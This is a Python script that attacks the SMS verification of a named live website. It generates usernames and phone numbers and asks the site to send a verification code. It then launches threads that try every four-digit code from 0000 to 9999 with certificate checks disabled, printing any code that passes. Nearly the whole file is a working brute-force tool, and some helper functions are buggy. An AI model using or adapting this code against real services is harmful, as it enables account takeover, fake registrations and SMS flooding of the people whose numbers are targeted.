# -*- coding=utf-8 -*-
import _thread
import urllib.request
import urllib.parse
import ssl
import json
import time



def usernameexit(username):
    ssl._create_default_https_context = ssl._create_unverified_context

    userexisturl = 'https://yy.cnns.net/api/queryuserexist?'

    t = time.time()
    userexistheaders = {
        # 'Accept': 'application/json, text/plain, */*',
        # 'Accept-Encoding': 'gzip, deflate, br',
        # 'Accept-Language': 'zh-CN,zh;q=0.9',
        # 'Connection': 'keep-alive',
        # 'Cookie': 'connect.sid=s%3AP8MWr_nfrhy7iOyb3nEyHVNQcBWTgRAf.PfOwrhkay2R2RNrfAReXlDDSXvVWdA2rPO2P6pY%2FzBg',
        # 'Host': 'yy.cnns.net',
        # 'If-None-Match': 'W/"3c-Gcipa+Pdg5p5k9yCA3NkFIyFZTM"',
        # 'Referer': 'https://yy.cnns.net/Index',
        # 'T-time': int(round(t * 1000)),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    }

    userexistdata = {
        'username': username,
    }

    query_string = urllib.parse.urlencode(userexistdata)
    userexisturl += query_string

    requset = urllib.request.Request(
        url=userexisturl, headers=userexistheaders)
    response = urllib.request.urlopen(requset)
    dict_json = json.loads(response.read().decode())
    if dict_json['message'] == "请求成功。":
        return True
    else:
        return False


def postsendsms(userphone):
    ssl._create_default_https_context = ssl._create_unverified_context

    sendsmspost_url = 'https://yy.cnns.net/api/sendsmsverify'

    t = time.time()
    sendsmsheaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    }

    sendsmsform_data = {
        'telno': userphone,
    }

    # 构建post请求
    request = urllib.request.Request(
        url=sendsmspost_url, headers=sendsmsheaders)
    form_data = urllib.parse.urlencode(sendsmsform_data).encode()
    # 发送post请求
    response = urllib.request.urlopen(request, data=form_data)
    dict_json = json.loads(response.read().decode())
    if dict_json['message'] == "验证码已发送。":
        return True
    else:
        print(dict_json)
        return False


def postsmscode(smscode, username, userphone):
    # print(smscode)
    ssl._create_default_https_context = ssl._create_unverified_context

    sendsmspost_url = 'https://yy.cnns.net/api/smscodeverify'

    t = time.time()
    sendsmsheaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    }

    sendsmsform_data = {
        'smscode': smscode,
    }

    # 构建post请求
    request = urllib.request.Request(
        url=sendsmspost_url, headers=sendsmsheaders)
    form_data = urllib.parse.urlencode(sendsmsform_data).encode()
    # 发送post请求
    response = urllib.request.urlopen(request, data=form_data)
    dict_json = json.loads(response.read().decode())
    if dict_json['message'] != "验证失败，请输入正确的验证码":
        print('尝试smscode ' + str(smscode) + ' 通过验证 ' +
              ' 用户名为' + str(username) + '手机号码为' + str(userphone))
        # print('尝试smscode ' + str(smscode) + ' 失败 ' + ' 用户名为' + str(username) + '手机号码为' + str(userphone))
        # print(dict_json)
        # return True
    # else:
        # print('尝试smscode ' + str(smscode) + ' 失败 ')
        # print('尝试smscode ' + str(smscode) + ' 通过验证 ' + ' 用户名为' + str(username) + '手机号码为' + str(userphone))
        # return False
    # return True


def testusername(username):
    username = username + "1"
    if usernameexit(username):
        return username
    else:
        username(username)


def testmail(usermail):
    usermail = usermail + "1"
    usermail2 = usermail + '@qq.com'
    if usernameexit(usermail2):
        return usermail2
    else:
        testmail(usermail)


def testphone(userphone):
    userphone = userphone + 1
    if usernameexit(userphone):
        return userphone
    else:
        testphone(userphone)


def sendsms(userphone):
    if postsendsms(userphone):
        return True
    else:
        return False


def sendsmscode(username, userphone):
    for num in range(0, 10000):
        
        if len(str(num)) < 4:
            for time in range(4 - len(str(num))):
                num = '0' + str(num)
        try:
            # print('开启新线程')
            _thread.start_new_thread( postsmscode,(num, username,userphone ) )
            # print('貌似进去了 但 为何没输出嘞')
            # time.sleep(0.2)
        except:
            print('Error: unable to start thread')
        
    # for num in range(0,10000):
    #     if len(str(num)) < 4:
    #         for time in range(4 - len(str(num))):
    #             num = '0' + str(num)
    #     # print(num)   
    #     postsmscode(num,username,userphone)
        


# def sendsmscode2():
#     for num in range(1,10000,2):
#         if len(str(num)) < 4:
#             for time in range(4 - len(str(num))):
#                 num = '0' + str(num)
#         print(num)
#         if postsmscode(num) == False :
#             return num



if __name__ == '__main__':
    username = 'wing18777'

    for num in range(3):
        username = testusername(username)
        usermail = testmail('102017')
        userphone = testphone(13174561277)
        if sendsms(userphone) == False:
            print("发送验证码失败")
        else :
            sendsmscode(username,userphone)
            # usercode = sendsmscode2()
        print(username)
